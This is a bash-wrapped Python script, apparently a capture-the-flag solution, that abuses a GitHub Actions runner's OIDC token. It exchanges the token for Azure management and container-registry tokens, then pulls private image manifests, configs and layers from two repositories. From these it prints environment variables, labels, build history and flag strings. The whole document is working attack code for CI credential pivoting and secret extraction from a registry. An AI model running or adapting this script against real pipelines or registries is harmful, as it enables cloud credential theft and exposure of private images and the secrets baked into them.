#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, gzip, io, tarfile, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
REG="crtblplatprodx3euoz.azurecr.io"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://management.azure.com/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
ARM=jg(b)["access_token"]
st,b=http(f"https://{REG}/oauth2/exchange",{"grant_type":"access_token","service":REG,"tenant":TEN,"access_token":ARM})
RT=jg(b)["refresh_token"]
def tok(scope):
    st,b=http(f"https://{REG}/oauth2/token",{"grant_type":"refresh_token","service":REG,"refresh_token":RT,"scope":scope})
    return jg(b).get("access_token")
ACCEPT=("application/vnd.docker.distribution.manifest.v2+json,"
        "application/vnd.oci.image.manifest.v1+json,"
        "application/vnd.docker.distribution.manifest.list.v2+json,"
        "application/vnd.oci.image.index.v1+json")
for repo in ("catalog-api","tebamoto-reporting-api"):
    t=tok(f"repository:{repo}:pull")
    H={"Authorization":"Bearer "+t}
    st,b=http(f"https://{REG}/v2/{repo}/tags/list", headers=H)
    tags=jg(b).get("tags",[]) or []
    print(f"\n### {repo} tags({st}): {tags}")
    for tg in tags[:6]:
        st,b=http(f"https://{REG}/v2/{repo}/manifests/{tg}", headers=dict(H, Accept=ACCEPT))
        man=jg(b)
        if "manifests" in man:
            dg=man["manifests"][0]["digest"]
            st,b=http(f"https://{REG}/v2/{repo}/manifests/{dg}", headers=dict(H, Accept=ACCEPT)); man=jg(b)
        cfg=man.get("config",{}).get("digest")
        print(f"  tag {tg}: config={cfg} layers={len(man.get('layers',[]))}")
        if cfg:
            st,b=http(f"https://{REG}/v2/{repo}/blobs/{cfg}", headers=H)
            c=jg(b)
            env=c.get("config",{}).get("Env",[]); lbl=c.get("config",{}).get("Labels") or {}
            print("    Env:", [e for e in env][:20])
            print("    Labels:", json.dumps(lbl)[:400])
            m=FLAG.search(b)
            if m: print("    [FLAG in config]", m.group(1).decode())
            for h in c.get("history",[])[-12:]:
                cc=h.get("created_by","")
                if FLAG.search(cc.encode()): print("    [FLAG in history]", cc[:300])
        for ly in man.get("layers",[])[:12]:
            st,b=http(f"https://{REG}/v2/{repo}/blobs/{ly['digest']}", headers=H)
            if st!=200: continue
            try: raw=gzip.decompress(b)
            except Exception: raw=b
            m=FLAG.search(raw)
            if m:
                print(f"    [FLAG in layer {ly['digest'][:20]}]", m.group(1).decode())
            else:
                try:
                    tf=tarfile.open(fileobj=io.BytesIO(raw))
                    for mem in tf.getmembers():
                        if mem.isfile() and mem.size < 200000:
                            d=tf.extractfile(mem).read()
                            mm=FLAG.search(d)
                            if mm: print(f"    [FLAG in {mem.name}]", mm.group(1).decode())
                except Exception: pass
PYEOF
echo "=== done ==="